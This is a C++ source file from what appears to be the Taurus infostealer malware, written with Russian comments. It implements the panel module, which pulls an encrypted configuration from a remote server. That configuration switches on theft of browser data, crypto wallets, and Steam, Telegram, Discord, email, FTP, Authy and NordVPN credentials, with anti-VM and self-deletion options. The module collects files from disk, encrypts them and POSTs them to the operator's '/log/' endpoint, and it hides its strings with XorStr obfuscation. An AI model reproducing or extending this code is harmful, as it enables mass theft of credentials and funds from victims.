#include "Common.h"

Config Panel::GetConfig()
{
	Config config = { true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, 0, true, true };

	string serverResponse = HTTP().POST(this->panelDomain, this->panelPort, XorStr("/cfg/"), Enc::Encrypt(this->uid));
	if (serverResponse.empty()) return config;

	serverResponse = Enc::Decrypt(serverResponse);
	if (serverResponse.empty()) return config;
	if (serverResponse == XorStr("fuck off")) Utils::SelfDel();
	if (serverResponse[0] != '[') { return config; }

	vector<string> respSplitted = Utils::splitBy(serverResponse, '#');
	if (!respSplitted.empty())
	{
		// парс основного конфига
		respSplitted[0] = respSplitted[0].substr(1).substr(0, respSplitted[0].size() - 2);

		vector<string> global = Utils::splitBy(respSplitted[0], ';', true);
		if (global.size() >= 9)
		{
			config.bChromium = BOOL_STR(global[0]);
			config.bGecko = BOOL_STR(global[1]);
			config.bEdge = BOOL_STR(global[2]);
			config.bHistory = BOOL_STR(global[3]);
			config.bSysInfo = BOOL_STR(global[4]);
			config.bScreenshot = BOOL_STR(global[5]);
			config.bCryptoWallets = BOOL_STR(global[6]);
			config.bSteam = BOOL_STR(global[7]);
			config.bTelegram = BOOL_STR(global[8]);
			config.bDiscord = BOOL_STR(global[9]);
			config.bJabber = BOOL_STR(global[10]);
			config.bFoxmail = BOOL_STR(global[11]);
			config.bOutlook = BOOL_STR(global[12]);
			config.bFileZilla = BOOL_STR(global[13]);
			config.bWinScp = BOOL_STR(global[14]);
			config.bAuthy = BOOL_STR(global[15]);
			config.bNordVpn = BOOL_STR(global[16]);

			global[17] = Utils::trimStr(global[17], ' ');
			if (!global[17].empty() && Utils::isNumeric(global[17]))
				config.MaxFilesSize = Utils::str2ull(global[17]);
			else
				config.MaxFilesSize = 0;

			config.bAntiVm = BOOL_STR(global[18]);
			config.bSelfDel = BOOL_STR(global[19]);
		}
		global.clear();

		// парс правил граббера
		if (respSplitted[1] != XorStr("[]"))
		{
			config.FileGrabberConfig = respSplitted[1];
		}

		// парс инфы о пк 
		respSplitted[2] = respSplitted[2].substr(1).substr(0, respSplitted[2].size() - 2);

		vector<string> internetData = Utils::splitBy(respSplitted[2], ';', true);
		if (internetData.size() >= 2)
		{
			config.IP = internetData[0];
			config.Country = internetData[1];
		}
		internetData.clear();

		// парс правил для лоадера
		if (respSplitted[3] != XorStr("[]"))
		{
			config.LoaderConfig = respSplitted[3];
		}
	}

	return config;
}

void Panel::AddFile(string outputName, string fileData)
{
	logData += XorStr("_TAURUS_FILE_NAME_") + outputName + XorStr("_TAURUS_FILE_DATA_") + fileData;
}

void Panel::AddFileFromDisk(string path, string outputName)
{
	string fileData = string();
	Utils::ReadAllText(path, fileData);
	if (!fileData.empty())
		AddFile(outputName, fileData);
}

bool Panel::AddFiles(string path, string mask, string output)
{
	WIN32_FIND_DATA data;
	HANDLE hFind = API(KERNEL32, FindFirstFileA)((path + '\\' + mask).c_str(), &data);
	if (hFind == INVALID_HANDLE_VALUE) return false;

	bool isCopied = false;
	string fileName = string();
	do
	{
		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		fileName = data.cFileName;
		AddFileFromDisk(path + '\\' + fileName, output + '\\' + fileName);
		isCopied = true;
	} while (API(KERNEL32, FindNextFileA)(hFind, &data));
	API(KERNEL32, FindClose)(hFind);

	return isCopied;
}

void Panel::BuildLog()
{
	string encryptedLog = Enc::Encrypt(this->logData);
	this->logData = encryptedLog;
}

bool Panel::SendLog()
{
	DEBUG("Sending logData...")
	string resp = HTTP().POST(this->panelDomain, this->panelPort, XorStr("/log/"), this->logData);
	DEBUG("LogData sended")
	if (resp.empty()) return false;

	resp = Enc::Decrypt(resp);
	DEBUG("Response decrypted")
	if (resp.empty()) return false;

	if (crc32_run(resp.c_str()) == CRC32_STR("OK")) return true;
	return false;
}
